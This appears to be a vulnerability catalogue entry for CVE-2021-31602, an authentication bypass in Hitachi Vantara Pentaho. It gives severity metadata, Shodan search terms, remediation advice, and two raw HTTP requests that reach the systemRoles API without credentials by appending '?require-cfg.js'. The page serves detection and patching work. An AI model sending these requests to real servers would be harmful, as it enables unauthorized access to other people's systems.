---
layout: post
cve_id: CVE-2021-31602
title: Hitachi Vantara Pentaho/Business Intelligence Server - Authentication Bypass
pcap: true
pcap_path: /pcaps/2021/CVE-2021-31602.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-31602.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pussycat0x
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  bypass authentication and gain unauthorized access to the server.

  '
remediation: 'Apply the latest security patches or updates provided by Hitachi Vantara
  to fix the authentication bypass vulnerability.

  '
reference:
- https://seclists.org/fulldisclosure/2021/Nov/13
- https://portswigger.net/daily-swig/remote-code-execution-sql-injection-bugs-uncovered-in-pentaho-business-analytics-software
- https://hawsec.com/publications/pentaho/HVPENT210401-Pentaho-BA-Security-Assessment-Report-v1_1.pdf
- https://www.hitachi.com/hirt/security/index.html
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31602
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-31602
  cwe-id: CWE-287
  epss-score: 0.92774
  epss-percentile: 0.99746
  cpe: cpe:2.3:a:hitachi:vantara_pentaho:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: hitachi
  product: vantara_pentaho
  shodan-query:
  - Pentaho
  - pentaho
tags:
- cve2021
- cve
- spring
- seclists
- pentaho
- auth-bypass
- hitachi
- vkev
- vuln
---

## üîç Vulnerability Description
Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence Server through 7.x are vulnerable to authentication bypass. The Security Model has different layers of Access Control. One of these layers is the applicationContext security, which is defined in the applicationContext-spring-security.xml file. The default configuration allows an unauthenticated user with no previous knowledge of the platform settings to extract pieces of information without possessing valid credentials.

## üåê HTTP Request
```nohighlight
GET /pentaho/api/userrolelist/systemRoles?require-cfg.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10.15, rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /api/userrolelist/systemRoles?require-cfg.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

